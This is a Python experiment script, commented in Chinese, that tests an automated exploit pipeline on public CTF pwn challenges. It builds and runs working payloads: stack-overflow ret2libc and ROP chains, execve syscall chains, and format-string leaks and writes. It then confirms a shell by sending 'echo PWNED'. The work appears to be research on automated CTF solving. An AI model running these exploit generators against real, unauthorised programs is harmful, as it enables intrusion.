"""
v032_real_challenges.src — 用真实赛题验证「入口 → 链 → 执行」

题目（ctf-wiki 收录的真实赛题，附件在 experiments/EXP-0032/real）：
    ret2text      bamboofox/NCTU：gets 溢出，跳 system("/bin/sh") 调用点
    ret2libc1     bamboofox/NCTU：gets 溢出，直接调用 system@plt("/bin/sh")
    rop           bamboofox/NCTU ret2syscall：无 system，需要 execve 系统调用链
    contacts      CSAW 2015：格式化字符串，且有 canary
    pwn3          CCTF 2016：格式化字符串（题目特有口令逻辑，暂不支持）
    leakmemory    ctf-wiki 格式化字符串：printf(s) 泄漏
    overwrite     ctf-wiki 格式化字符串：写 c=16

流程
    1. 产品分析（secknow.solving.binary）：位数、保护、导入入口、调用图、后门候选；
    2. 产品链选择（secknow.solving.chains）：libc-call / syscall-execve / format-string；
    3. 适配层（常驻 pwntools worker）执行：
       - libc-call / syscall-execve：构造 payload 并真拿 shell；
       - format-string：定位偏移后泄漏或写入，用程序的成功输出判定。

运行
    python versions/v032_real_challenges.src

产出
    experiments/EXP-0032/{results.json,report.md}
"""

from __future__ import annotations

import json
import re
import struct
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
OUT_DIR = ROOT / "experiments" / "EXP-0032"
REAL_DIR = OUT_DIR / "real"

sys.path.insert(0, str(ROOT / "src"))

from secknow.solving.adapters import PwntoolsWorker, ToolUnavailable  # noqa: E402
from secknow.solving.binary import analyze  # noqa: E402
from secknow.solving.chains import build_chains  # noqa: E402

for _stream in (sys.stdout, sys.stderr):
    if hasattr(_stream, "reconfigure"):
        try:
            _stream.reconfigure(encoding="utf-8", errors="replace")
        except (ValueError, OSError):
            pass


def log(message: str) -> None:
    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)


# (name, note, strategy, success_marker)
CASES = [
    ("ret2text", "栈溢出 → system('/bin/sh') 调用点", "auto", "PWNED"),
    ("ret2libc1", "栈溢出 → system@plt('/bin/sh')", "auto", "PWNED"),
    ("rop", "ret2syscall：无 system，需要 execve 链", "auto", "PWNED"),
    ("contacts", "格式化字符串 + canary", "auto", "PWNED"),
    ("pwn3", "格式化字符串（题目特有口令逻辑）", "unsupported", "PWNED"),
    ("leakmemory", "格式化字符串泄漏", "fmtstr_leak", "LEAK"),
    ("overwrite", "格式化字符串写 c=16", "fmtstr_write", "modified c."),
    ("ret2libc2", "溢出 → gets(buf2) 后 system(buf2)", "auto", "PWNED"),
    ("ret2libc3", "泄漏 puts → system", "auto", "PWNED"),
    ("ret2shellcode", "栈 shellcode（需栈地址）", "auto", "PWNED"),
]


def p32(value: int) -> bytes:
    return struct.pack("<I", value)


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def gadgets_for(worker: PwntoolsWorker, binary: Path) -> dict[str, int]:
    try:
        data = worker.gadgets(binary)
    except ToolUnavailable:
        return {}
    found: dict[str, int] = {}
    for gadget in data.get("gadgets", []):
        found.setdefault(";".join(gadget["insns"]), gadget["address"])
    return found


def build_libc_payloads(profile, worker: PwntoolsWorker):
    plt = profile.plt_names
    system = plt.get("system")
    shell = (profile.strings.get("/bin/sh") or profile.strings.get("/bin/bash") or [None])[0]
    if system is None or shell is None:
        return [], [], "no_system_or_shell"
    if profile.bits == 32:
        exit_plt = plt.get("exit", 0x08048400)
        offsets = list(range(96, 161, 4))
        payloads = [b"A" * offset + p32(system) + p32(exit_plt) + p32(shell)
                    for offset in offsets]
        return payloads, offsets, None
    gadgets = gadgets_for(worker, profile.path)
    pop_rdi = gadgets.get("pop rdi;ret") or gadgets.get("pop rdi; ret")
    ret = gadgets.get("ret")
    if pop_rdi is None:
        return [], [], "gadget_missing:pop rdi;ret"
    offsets = list(range(40, 201, 8))
    payloads = []
    for offset in offsets:
        payload = b"A" * offset
        if ret is not None:
            payload += p64(ret)
        payload += p64(pop_rdi) + p64(shell) + p64(system)
        payloads.append(payload)
    return payloads, offsets, None


def build_syscall_payloads(profile, worker: PwntoolsWorker):
    shell = (profile.strings.get("/bin/sh") or profile.strings.get("/bin/bash") or [None])[0]
    if shell is None:
        return [], [], "no_shell_string"
    offsets = list(range(96, 161, 4)) if profile.bits == 32 else list(range(40, 201, 8))
    payloads = []
    missing: list[str] = []
    for offset in offsets:
        try:
            data = worker.execve_chain(profile.path, shell, offset)
        except ToolUnavailable as error:
            return [], [], str(error)
        missing = data.get("missing") or []
        if data.get("payload") is None:
            break
        payloads.append(bytes.fromhex(data["payload"]))
    if missing or not payloads:
        return [], [], "gadget_missing:" + ",".join(missing or ["unknown"])
    return payloads, offsets, None


def run_payloads(worker: PwntoolsWorker, binary: Path, payloads: list[bytes],
                 marker: str) -> dict:
    return worker.run_chain(binary, payloads, post=b"echo PWNED; exit\n",
                            marker=marker, timeout=3)


def evaluate(worker: PwntoolsWorker, name: str, note: str,
             strategy: str, marker: str) -> dict:
    binary = REAL_DIR / name
    started = time.perf_counter()
    record: dict = {"id": name, "note": note, "binary": str(binary)}
    try:
        profile = analyze(binary)
    except Exception as error:  # noqa: BLE001
        record.update({"verdict": "failed", "reason": f"analyze:{type(error).__name__}",
                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
        return record

    categories = [finding.category for finding in profile.findings()]
    chains = build_chains(categories, profile)
    record.update({
        "bits": profile.bits, "pie": profile.is_pie, "canary": profile.has_canary,
        "nx": profile.has_nx,
        "imports": sorted(profile.imports & {
            "gets", "system", "printf", "fgets", "read", "execve"}),
        "entries": categories,
        "chains": [{"id": chain.chain_id, "status": chain.status, "reason": chain.reason}
                   for chain in chains],
        "win_candidates": profile.win_candidates[:3],
    })

    def finish(verdict: str, reason: str | None = None, **extra) -> dict:
        record.update(extra)
        record.update({"verdict": verdict, "reason": reason,
                       "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)})
        return record

    if profile.has_canary or profile.is_pie:
        return finish("refused", "canary_present" if profile.has_canary else "pie_enabled")

    if strategy == "unsupported":
        return finish("unsupported", "challenge_specific_logic")

    library_call = next((chain for chain in chains if chain.chain_id == "libc-call"), None)
    syscall_chain = next((chain for chain in chains if chain.chain_id == "syscall-execve"), None)

    staged_chain = next((chain for chain in chains if chain.chain_id == "staged-call"), None)
    leak_chain = next((chain for chain in chains if chain.chain_id == "ret2libc-leak"), None)
    shellcode_chain = next((chain for chain in chains if chain.chain_id == "ret2shellcode"), None)

    if library_call is not None:
        payloads, offsets, error = build_libc_payloads(profile, worker)
        mode = "libc-call"
    elif syscall_chain is not None:
        payloads, offsets, error = build_syscall_payloads(profile, worker)
        mode = "syscall-execve"
    elif staged_chain is not None:
        return evaluate_staged_call(worker, profile, marker, finish)
    elif leak_chain is not None:
        return evaluate_leak_chain(worker, profile, marker, finish)
    elif shellcode_chain is not None:
        return finish("unsupported", "needs_stack_address")
    elif strategy == "fmtstr_write" or strategy == "fmtstr_leak":
        return evaluate_format_string(worker, profile, strategy, marker, finish)
    else:
        return finish("unsupported", "no_chain_for_this_class")

    if error is not None:
        return finish("unsupported", error)
    try:
        result = run_payloads(worker, binary, payloads, marker)
    except ToolUnavailable as tool_error:
        return finish("failed", str(tool_error))
    if not result.get("solved"):
        return finish("failed", "payload_failed", attempts=result.get("attempts"),
                      mode=mode)
    index = result.get("index")
    return finish("solved", None, mode=mode,
                  offset=offsets[index] if index is not None else None,
                  attempts=result.get("attempts"))


def evaluate_staged_call(worker: PwntoolsWorker, profile, marker: str, finish) -> dict:
    offsets = list(range(96, 141))
    try:
        built = worker.ret2libc_bss(profile.path, offsets)
    except ToolUnavailable as error:
        return finish("failed", str(error))
    payloads = [bytes.fromhex(payload) for payload in built.get("payloads", [])]
    if not payloads:
        return finish("unsupported", "bss_payload_build_failed")
    try:
        result = worker.run_chain(profile.path, payloads,
                                  post=b"/bin/sh\necho PWNED; exit\n",
                                  marker=marker, timeout=2)
    except ToolUnavailable as error:
        return finish("failed", str(error))
    if not result.get("solved"):
        return finish("failed", "payload_failed", mode="staged-call",
                      attempts=result.get("attempts"))
    index = result.get("index")
    return finish("solved", None, mode="staged-call",
                  offset=offsets[index] if index is not None else None,
                  attempts=result.get("attempts"))


def evaluate_leak_chain(worker: PwntoolsWorker, profile, marker: str, finish) -> dict:
    offsets = list(range(96, 141))
    try:
        result = worker.ret2libc_leak(profile.path, offsets)
    except ToolUnavailable as error:
        return finish("failed", str(error))
    if not result.get("solved"):
        return finish("unsupported" if result.get("error") else "failed",
                      result.get("error") or "payload_failed",
                      mode="ret2libc-leak", attempts=result.get("attempts"))
    return finish("solved", None, mode="ret2libc-leak",
                  offset=result.get("offset"), leak_offset=result.get("leak_offset"),
                  attempts=result.get("attempts"))


def evaluate_format_string(worker: PwntoolsWorker, profile, strategy: str,
                           marker: str, finish) -> dict:
    binary = profile.path
    try:
        probe = worker.fmtstr_offset(binary)
    except ToolUnavailable as error:
        return finish("failed", str(error))
    offset = probe.get("offset")
    if offset is None:
        return finish("unsupported", "fmtstr_offset_not_found")
    if strategy == "fmtstr_write":
        try:
            result = worker.fmtstr_auto(binary, offset, value=16)
        except ToolUnavailable as error:
            return finish("failed", str(error))
        solved = bool(result.get("solved")) and marker in result.get("output", "")
        return finish("solved" if solved else "failed",
                      None if solved else "write_not_observed",
                      mode="fmtstr-write", offset=offset,
                      address=hex(result["address"]) if result.get("address") else None)
    payload = b"%p." * 8
    try:
        result = worker.fmtstr_leak(binary, payload)
    except ToolUnavailable as error:
        return finish("failed", str(error))
    tokens = re.findall(r"0x[0-9a-fA-F]+", result.get("output", ""))
    solved = len(tokens) >= 3
    return finish("solved" if solved else "failed",
                  None if solved else "leak_not_observed",
                  mode="fmtstr-leak", offset=offset, leaked=len(tokens))


def write_report(results: list[dict]) -> None:
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    summary = {
        "cases": len(results),
        "solved": sum(1 for item in results if item.get("verdict") == "solved"),
        "refused": sum(1 for item in results if item.get("verdict") == "refused"),
        "unsupported": sum(1 for item in results if item.get("verdict") == "unsupported"),
        "failed": sum(1 for item in results if item.get("verdict") == "failed"),
    }
    (OUT_DIR / "results.json").write_text(
        json.dumps({"summary": summary, "cases": results}, ensure_ascii=False, indent=2),
        encoding="utf-8")

    lines = ["# EXP-0032 — 真实赛题验证", "",
             "## 汇总", "", "```json", json.dumps(summary, ensure_ascii=False, indent=2),
             "```", "",
             "## 逐题", "",
             "| 题 | 位数 | 保护 | 入口 | 链 | 判定 | 耗时 |",
             "| --- | --- | --- | --- | --- | --- | --- |"]
    for item in results:
        protections = (f"canary={item.get('canary')} pie={item.get('pie')}"
                       if "canary" in item else "—")
        chain_ids = ", ".join(chain["id"] for chain in item.get("chains", [])) or "—"
        lines.append(
            f"| {item['id']} | {item.get('bits', '—')} | {protections} "
            f"| {', '.join(item.get('entries', [])) or '无'} | {chain_ids} "
            f"| {item.get('verdict')}（{item.get('reason') or '—'}） "
            f"| {item.get('elapsed_ms')} ms |")
    lines += ["", "## 说明", "",
              "- 题目与附件来自 ctf-wiki 收录的真实赛题（NCTU bamboofox / CSAW 2015 / CCTF 2016）；",
              "- 分析用产品代码，执行用适配层（pwntools 常驻 worker）；",
              "- libc/syscall 链的判据是真拿到 shell；fmtstr 写用程序的成功输出判定；",
              "- 题目特有口令逻辑（pwn3）与需要多阶段堆布局的题（contacts）如实标为不支持/拒绝。"]
    (OUT_DIR / "report.md").write_text("\n".join(lines) + "\n", encoding="utf-8")


def main() -> None:
    worker = PwntoolsWorker()
    available = worker.available(timeout=30)
    log(f"worker available={available} version={worker.version}")
    results = []
    for name, note, strategy, marker in CASES:
        result = evaluate(worker, name, note, strategy, marker)
        results.append(result)
        log(f"{name}: {result.get('verdict')} ({result.get('reason') or '—'})"
            f"{' offset=' + str(result.get('offset')) if result.get('offset') else ''}")
    worker.close()
    write_report(results)
    summary = json.loads((OUT_DIR / "results.json").read_text(encoding="utf-8"))["summary"]
    log(f"汇总：解出 {summary['solved']}/{summary['cases']}，拒绝 {summary['refused']}，"
        f"不支持 {summary['unsupported']}，失败 {summary['failed']}")


if __name__ == "__main__":
    main()
